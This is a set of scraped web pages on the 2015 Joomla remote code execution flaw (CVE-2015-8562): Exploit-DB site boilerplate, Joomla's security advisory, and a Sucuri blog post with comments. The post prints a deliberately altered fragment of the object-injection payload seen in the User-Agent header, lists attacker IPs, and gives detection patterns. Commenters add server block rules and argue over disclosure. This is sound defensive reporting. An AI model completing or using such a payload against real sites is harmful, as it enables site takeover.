recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from packetstormsecurity.com_6ef583c0_20250124_185654.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from developer.joomla.org_bac18f33_20250124_185702.html ===


* Joomla!®
  + About us
  + [Joomla Home](https://www.joomla.org)
  + [What is Joomla?](https://www.joomla.org/about-joomla.html)
  + [Benefits & Features](https://www.joomla.org/core-features.html)
  + [Project & Leadership](https://www.joomla.org/about-joomla/the-project.html)
  + [Trademark & Licensing](https://tm.joomla.org)
  + [The Joomla Foundation](https://joomlafoundation.org)
  + Support us
  + [Contribute](https://www.joomla.org/contribute-to-joomla.html)
  + [Sponsor](https://www.joomla.org/sponsor.html)
  + [Partner](https://www.joomla.org/about-joomla/partners.html)
  + [Shop](https://shop.joomla.org)
* Download & Extend
  + [Downloads](https://downloads.joomla.org)
  + [Extensions](https://extensions.joomla.org)
  + [Languages](https://community.joomla.org/translations.html)
  + [Get a free site](https://launch.joomla.org)
  + [Get a domain](https://domains.joomla.org)
* Discover & Learn
  + [Documentation](https://docs.joomla.org)
  + [Training](https://community.joomla.org/joomla-training.html)
  + [Certification](https://certification.joomla.org)
  + [Site Showcase](https://showcase.joomla.org)
  + [Announcements](https://www.joomla.org/announcements.html)
  + [Blogs](https://community.joomla.org/blogs.html)
  + [Magazine](https://magazine.joomla.org)
* Community & Support
  + [Community Portal](https://community.joomla.org)
  + [Events](https://community.joomla.org/events.html)
  + [User Groups](https://community.joomla.org/user-groups.html)
  + [Forum](https://forum.joomla.org)
  + [Service Providers Directory](https://community.joomla.org/service-providers-directory.html)
  + [Volunteers Portal](https://volunteers.joomla.org)
  + [Vulnerable Extensions List](https://extensions.joomla.org/vulnerable-extensions/vulnerable/)
* Developer Resources
  + [Developer Network](https://developer.joomla.org)
  + [Security Centre](https://developer.joomla.org/security.html)
  + [Issue Tracker](https://issues.joomla.org)
  + [GitHub](https://github.com/joomla)
  + [API Documentation](https://api.joomla.org)
  + [Joomla! Framework](https://framework.joomla.org)

Search

# [Joomla! Developer Network™](/)

[Download](https://downloads.joomla.org/)

[Launch](https://launch.joomla.org)

* [Home](/)
* [News](/news.html)
* [Project Roadmap](/roadmap.html)
* [CMS](/cms.html)
* [Framework](/framework.html)
* [Tracker](/tracker.html)
* [About](/about.html)
* [Security](/security.html)

# Security Announcements

## [20151201] - Core - Remote Code Execution Vulnerability

* **Project:** Joomla!
* **SubProject:** CMS
* **Severity:** High
* **Versions:** 1.5.0 through 3.4.5
* **Exploit type:** Remote Code Execution
* **Reported Date:** 2015-December-13
* **Fixed Date:** 2015-December-14
* **CVE Numbers:** [CVE-2015-8562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8562)

### Description

Browser information is not filtered properly while saving the session values into the database which leads to a Remote Code Execution vulnerability.

### Affected Installs

Joomla! CMS versions 1.5.0 through 3.4.5

### Solution

Upgrade to version 3.4.6

### Contact

The JSST at the [Joomla! Security Centre](/security-centre.html "Contact the JSST").

**Reported By:** Uwe Flottemensch
[Previous article: [20151206] - Core - Session Hardening
 Prev](/security-centre/639-20151206-core-session-hardening.html)
[Next article: [20151205] - Session - Remote Code Execution Vulnerability
Next](/security-centre/637-20151205-session-remote-code-execution-vulnerability.html)

1. You are here:
2. [Home](/)
3. [Security Announcements](/security-centre.html)
4. [20151201] - Core - Remote Code Execution Vulnerability

### Joomla! CMS

* [Current Release ![Joomla! CMS 3](/images/joomla-logo.png)](https://downloads.joomla.org/latest)
* [View known Issues](https://issues.joomla.org)
* [Development Status](https://github.com/joomla/joomla-cms#build-status)
* [Download Nightly builds](/nightly-builds.html)

### Joomla! Framework

* [Current Release ![Joomla! Framework Logo](/images/joomla-framework.png) 2**.x**](https://framework.joomla.org)
* [Development Status](https://framework.joomla.org/status)

### Resources

* [Development Strategy](/development-strategy.html)
* [Security Announcements](/security-centre.html)
* [Report Security Issues](/security/contact-the-team.html)
* [Usage Statistics](/about/stats.html)
* [Statistics API Documentation](/about/stats/api.html)
* [Joomla! API Documentation](https://api.joomla.org)
* [Coding Standards Manual](/coding-standards.html)
* [JoomlaCode Archive](/joomlacode-archive.html)

### Mailing Lists

* [Developer Network Newsletter](https://community.joomla.org/joomla-developer-network-newsletter.html)
* [General Extensions Mailing](https://groups.google.com/group/joomla-dev-general)
* [CMS Mailing](https://groups.google.com/group/joomla-dev-cms)
* [Framework Mailing](https://groups.google.com/group/joomla-dev-framework)
* [Documentation Mailing](https://groups.google.com/group/joomla-docs)

---

* [Joomla! on Twitter](https://twitter.com/joomla "Joomla! on Twitter")
* [Joomla! on Facebook](https://www.facebook.com/joomla "Joomla! on Facebook")
* [Joomla! on YouTube](https://www.youtube.com/user/joomla "Joomla! on YouTube")
* [Joomla! on LinkedIn](https://www.linkedin.com/company/joomla "Joomla! on LinkedIn")
* [Joomla! on Pinterest](https://www.pinterest.com/joomla "Joomla! on Pinterest")
* [Joomla! on Instagram](https://www.instagram.com/joomlaofficial/ "Joomla! on Instagram")
* [Joomla! on GitHub](https://github.com/joomla "Joomla! on GitHub")

* [Home](https://www.joomla.org)
* [About](https://www.joomla.org/about-joomla.html)
* [Community](https://community.joomla.org)
* [Forum](https://forum.joomla.org)
* [Extensions](https://extensions.joomla.org)
* [Services](https://community.joomla.org/service-providers-directory.html)
* [Docs](https://docs.joomla.org)
* [Developer](https://developer.joomla.org)
* [Shop](https://community.joomla.org/the-joomla-shop.html)

* [Accessibility Statement](https://www.joomla.org/accessibility-statement.html)
* [Privacy Policy](https://www.joomla.org/privacy-policy.html)
* [Cookie Policy](https://www.joomla.org/cookie-policy.html)
* [Sponsor Joomla! with $5](https://community.joomla.org/sponsorship-campaigns.html)
* [Help Translate](https://joomla.crowdin.com)
* [Report an Issue](https://github.com/joomla/joomla-websites/issues/new?title=[jdev]%20&body=Please%20describe%20the%20problem%20or%20your%20issue)
* [Log in](/component/content/article/630-20151214-core-remote-code-execution-vulnerability.html?layout=blog&Itemid=&catid=13)

© 2005 - 2025 [Open Source Matters, Inc.](https://opensourcematters.org) All Rights Reserved.

[![Rochen](https://cdn.joomla.org/rochen/rochen_footer_logo_white.svg)](https://www.rochen.com/joomla-hosting)
[Joomla! Hosting by Rochen](https://www.rochen.com/joomla-hosting)

Close

We have detected that you are using an ad blocker. The Joomla! Project relies on revenue from these advertisements so please consider disabling the ad blocker for this domain.



=== Content from blog.sucuri.net_a788b3f8_20250124_185701.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Joomla Security](https://blog.sucuri.net/category/joomla-security)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
# Critical 0-day Remote Command Execution Vulnerability in Joomla

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g)](https://blog.sucuri.net/author/dcid)   [Daniel Cid](https://blog.sucuri.net/author/dcid)

* December 14, 2015
 ![](https://blog.sucuri.net/wp-content/uploads/2015/10/Disclosure-Image-Joomla-820x386.png)

**Nov 2016 Update:** If you need to clean your hacked Joomla site, we have released a new free guide to show you how to identify and remove hacks.

[Read the Guide!](https://sucuri.net/guides/how-to-clean-hacked-joomla)

The Joomla security team have just released a new version of Joomla to [patch](https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html) a critical remote command execution vulnerability that affects all versions from 1.5 to 3.4.

This is a serious vulnerability that can be easily exploited and is already in the wild. If you are using Joomla, you have to [update](https://www.joomla.org/announcements/release-news/5641-joomla-3-4-6-released.html) it right now. If you need [joomla security](https://sucuri.net/website-security/joomla-malware-removal/) and malware removal, contact our team.

**Update – 2015/12/14, 17:15PM EST** If you are using the old (unsupported) versions 1.5.x and 2.5.x, you have to apply the hotfixes from [here](https://docs.joomla.org/Security_hotfixes_for_Joomla_EOL_versions). This [article](https://www.ostraining.com/blog/joomla/hotfixes/) from OSTraining explains how to apply them.

## Zero day Exploits in the Wild

What is very concerning is that this vulnerability is already being exploited in the wild and has been for the last 2 days. Repeat: This has been in the wild as a 0-day for 2 days before there was a patch available.

Looking back at our logs, we detected the first exploit targeting this vulnerability on Dec 12, at 4:49PM:

```
2015 Dec 12 16:49:07 clienyhidden.access.log
 Src IP: 74.3.170.33 / CAN / Alberta
 74.3.170.33 - - [12/Dec/2015:16:49:40 -0500] "GET /contact/ HTTP/1.1" 403 5322 "http://google.com/" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3: ..
 {s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0: .. {}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:..
 {s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:60:..
```

We modified the payload so it can’t be misused, but the attackers are doing an object injection via the HTTP user agent that leads to a full remote command execution.

We detected more exploits from this same IP address “74.3.170.33” on Dec 12th, followed by hundreds more exploit attempts from 146.0.72.83 and 194.28.174.106 on Dec 13th.

Today (Dec 14th), the wave of attacks is even bigger, with basically every site and honeypot we have being attacked. That means that probably every other Joomla site out there is being targeted as well.

## Protect Your Site Now

If you are a Joomla user, check your logs right away. Look for requests from **146.0.72.83** or **74.3.170.33** or **194.28.174.106** as they were the first IP addresses to start the exploitation. I also recommend searching your logs for “**JDatabaseDriverMysqli**” or “**O:**” in the User Agent as it has been used in the exploits. If you find them, consider your Joomla site compromised and move to the remediation / incident response phase.

Note that clients behind the [Sucuri Firewall](https://sucuri.net/website-firewall/) were already protected against this threat and are safe. Yes, our virtual patching for the HTTP User Agent kept our users protected against this exploit.

## **If You Use Joomla, Update ASAP!**

For those on the **3.x branch**, update immediately to **3.4.6.** There will be [unofficial fixes for Joomla! **1.5.x and 2.5.x**](https://docs.joomla.org/Security_hotfixes_for_Joomla_EOL_versions) provided soon. Anyone using those versions should stay aware and update as soon as possible.

We are still monitoring the issue and will provide more updates as we learn more. If you require [Joomla malware cleanup](https://sucuri.net/website-security/joomla-malware-removal/) services, our team is happy to help restore, protect, and monitor your site going forward.

  [![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=120&d=mm&r=g)](https://blog.sucuri.net/author/dcid)
##### [Daniel Cid](https://blog.sucuri.net/author/dcid)

Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the GoDaddy Security Products group. He is also the founder of OSSEC and [CleanBrowsing](https://cleanbrowsing.org). You can find more about Daniel on his site [dcid.me](http://dcid.me) or on [Twitter: @danielcid](https://twitter.com/danielcid)

##### Related Tags

* [Zero-Day](https://blog.sucuri.net/tag/zero-day)
##### 129 comments

1. ![](https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=60&d=mm&r=g) **[Jan R](https://www.saotn.org)** says: [December 14, 2015 at 6:04 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7037)

   To mitigate the attacks before updating Joomla, would it be sufficient to deny “strange” user-agent strings? For example in your .htaccess to deny user-agent strings containing an accolade { :

   `RewriteCond %{HTTP_USER_AGENT} .*{.* [NC]
    RewriteRule .* - [F,L]`

   1. ![](https://secure.gravatar.com/avatar/79082c22d49ed5d836e3eae8da00dada?s=60&d=mm&r=g) **[Lee Wei Yeong](http://evandrix.github.io)** says: [December 14, 2015 at 6:35 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7039)

      Any equivalent rule for `nginx`?

      1. ![](https://secure.gravatar.com/avatar/e63b10e3b702211edd89fef5df4178d2?s=60&d=mm&r=g) **[ionut](https://ionutlupu.me)** says: [December 14, 2015 at 7:18 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7041)

         Try with this inside your server block:

         if ( $http\_user\_agent ~\* ({|}) ) {
          return 403;
          }
   2. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 8:55 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7045)

      That would work. I would also recommend blocking O:[0-9] as an additional hardening.
   3. ![](https://secure.gravatar.com/avatar/9825eca67c0a45c4217628fd7b817138?s=60&d=mm&r=g) **Marco** says: [December 14, 2015 at 10:10 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7058)

      Warning, from my apache logs, some users use those kinds of user-agent :

      Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SIMBAR={19D004AF-08EA-11E2-BEF2-000000000000}; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; MSOffice 12)

      Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; BTRS121932; SIMBAR={1605FC0C-5EB7-4998-85F3-AB145EAFDD05}; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; TmstmpExt)

      You should try :
        `RewriteCond %{HTTP_USER_AGENT} O:[0-9]+: [NC]
       RewriteRule .* - [F]`

      1. ![](https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=60&d=mm&r=g) **[Jan R](https://www.saotn.org)** says: [December 15, 2015 at 5:20 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7084)

         Thanks for your reply Marco! Sometimes you have to take drastic measures which may block legitimate visitors. However, such mitigation measures should never be in place for longer than a day or so, only in between the time of hearing about the exploit and updating Joomla.
      2. ![](https://secure.gravatar.com/avatar/ffc55135ca520a10abb514ff03d144f0?s=60&d=mm&r=g) **Esa Jokinen** says: [December 15, 2015 at 1:31 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7097)

         As mod\_rewrite doesn’t work on Apache server level without “RewriteOption InheritDown” (available from Apache 2.4.8) I’d suggest using BrowserMatch directive instead (in conf.d/):

         `BrowserMatch O:[0-9] joomla-exploit-workaround`

         Deny from env=joomla-exploit-workaround
2. ![](https://secure.gravatar.com/avatar/caa5fd2d084d87ee1454c4314b7c21d2?s=60&d=mm&r=g) **[Brian Teeman](http://brian.teeman.net)** says: [December 14, 2015 at 6:31 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7038)

   As always Sucuri chose to promote their own services first – sad

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 9:01 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7047)

      We are proud of what we do here. We are proud that our work can protect our clients even from some 0-day exploits going out there.

      But this post is far from promoting ourselves. In fact, we only mentioned it to let our clients know that they are safe/protected.

      Anyone else can either update Joomla, use ModSecurity or any other WAF to protect themselves.
   2. ![](https://secure.gravatar.com/avatar/bb2a6e85307e20ae78274f527a180f4b?s=60&d=mm&r=g) **Canuckistani** says: [December 14, 2015 at 9:05 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7048)

      It’s their website, it’s their article and it highlights what their service is finding. They should be hyping up their own services on their own website – nobody works for free!

      1. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor** says: [December 14, 2015 at 10:38 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7066)

         They only found it once it was reported by the Joomla team and they searched their historic log files!
   3. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **[Tony Perez](http://perezbox.com/)** says: [December 14, 2015 at 9:30 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7055)

      Hey @brianteeman:disqus

      Too bad you didn’t feel you could come to me with this concern.

      As my partner explained, we are in fact very proud of what we do here. We do more to bring awareness to the issue than most realize, and we report on what we’re seeing via our network to help provide perspective and context. So yes, if we reference that our customers are in fact protected, being it’s a question we’ll get asked, then sincerest apologies for the inconvenience.

      Too bad though..

      Tony

      1. ![](https://secure.gravatar.com/avatar/8ff7688dd7aaf66effb89c65203ee7c3?s=60&d=mm&r=g) **Jérôme Segura** says: [December 15, 2015 at 12:24 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7074)

         Well said Tony 🙂
      2. ![](https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=60&d=mm&r=g) **Alan Langford** says: [December 16, 2015 at 4:41 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7137)

         I think Brian’s concern, although not well phrased, is that your reports tend to offer too much information during a period where site administrators may not have had a chance to update their sites. There are a lot of administrators who are lax when it comes to updating. Although the exploit is available in the hacker community, I don’t think it’s safe to assume that all potential hackers are sufficiently plugged into that community to be aware of the details. By publishing the details of the exploit simultaneously with the availability of the patch, those of us on this side of the fence feel that you’re giving people a tool to go and do significant damage, all for being able to take credit for breaking the news.

         I for one would be much happier if you announced the vulnerability in more general terms at the time the update was made available, but withheld the technical details for several days. Granted this is less of an issue when the exploit is in the wild, but you have done this with undisclosed vulnerabilities, and I personally feel that put a lot of sites at risk for no good reason.

         1. ![](https://secure.gravatar.com/avatar/72345495398482431830b8470c59a582?s=60&d=mm&r=g) **Alycia** says: [December 16, 2015 at 5:13 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7142)

            There is no POC in the post, so unsure about giving people a tool to go
             and do significant damage? The post does provide IPs for admins to watch for. In my humble opinion, any major RCE vulnerability will
             attract hackers to seek underground discussions…. no matter how
             general you keep the disclosure among whitehats.
         2. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **[Tony Perez](http://perezbox.com/)** says: [December 16, 2015 at 8:24 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7148)

            Hi @abivia:disqus

            I’m pretty sure I understand @brianteeman:disqus intent pretty well.

            As for your points on what, specifically how much we provide. Our position is, and continues to be that we’ll disclose whatever information we have available that is already public knowledge. This was an active Zero day, needed to be shared and we use what we have at our disposal to get the information out.

            Something to consider. In your argument you are focusing on the “lax” administrator; in turn we’re focusing on the proactive ones. Those that care, and use the information we share to protect their properties. There is little we can do for those that don’t care.

            What we share is valuable, and it makes a difference. There are two sides to the fence, and there are just as many administrators thanking us, as those that share similar sentiments as to those you have expressed.

            Thank you though, for sharing your thoughts.

            Tony

            1. ![](https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=60&d=mm&r=g) **Alan Langford** says: [December 16, 2015 at 10:34 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7153)

               My consideration of the “lax” administrator comes from considerable experience. There are several sub-cases of this, the worst being someone who built a site for a customer, gave them no guidance on maintenance, and moved on. These are the sites running things like Joomla 1.5.6 and frankly I have no idea how they survive unscathed. These administrators don’t even know what a security advisory is and there’s not much we can do about that.

               However there are a lot of reasonably responsible administrators who are also small business owners where their website is a necessary but non-critical part of their business. Some of them have day jobs. Some of them travel. Some of them have calendars booked days in advance. Anecdotally, I’d submit that the vast majority of Joomla and WordPress sites fall into this category. As far as I’m concerned, anything that increases the risk of their site being attacked before they can find the time to perform an upgrade is non-optimal.

               To be clear, I have no issue with the release of information that’s tangential to the exploit such as IP source addresses, and I realize that not publishing won’t deter a serious hacker from getting his hands on the exploit. One of the joys of open source is that a simple diff on the update frequently exposes the nature of the vulnerability. Yet as far as I’m concerned, anything that makes it a little more difficult–even for the curious amateur hacker–is a good thing because it might just buy someone the few days they need to find the time to update. This is particularly so at a time of year when we’ve got a lot of bored university students who have finished exams and can’t find anything better to do.

               I realize that administrators who are on the ball appreciate full disclosure, but at the same time those will be the administrators who have patched their systems, or who can afford to make use of your services. They’re at less risk, by definition. Meanwhile, collating all the “public” information and releasing it as the patch becomes available clearly does not benefit the people who can’t drop everything and patch, or those who can’t afford your services.

               I don’t expect you to change your policies. After all, somewhere between the responsible administrators and the people who can’t afford you is your pool of new customers, and what could better focus their attention than getting hacked? I’m just elaborating on why you might be the subject of the occasional frustrated remark.
            2. ![](https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=60&d=mm&r=g) **[Tony Perez](http://perezbox.com/)** says: [December 17, 2015 at 3:45 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7158)

               Hi @abivia:disqus

               All fair points.

               There are obviously a number of counter points that can be made, but alas we’d get into a philosophical debate in which there really is no right or wrong, only perspective and personal opinion. Thanks though for sharing your concerns and insights.

               Tony
         3. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 8:29 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7151)

            The attackers knew all they needed to know already.

            All we did was to close the gap between the attackers and webmasters. Our post gave visibility to webmasters and helped them react/protect themselves.

            Not only webmasters, but many security companies, hosting companies and web developers thanked us for sharing the details and to help them understand their risks.

            thanks,
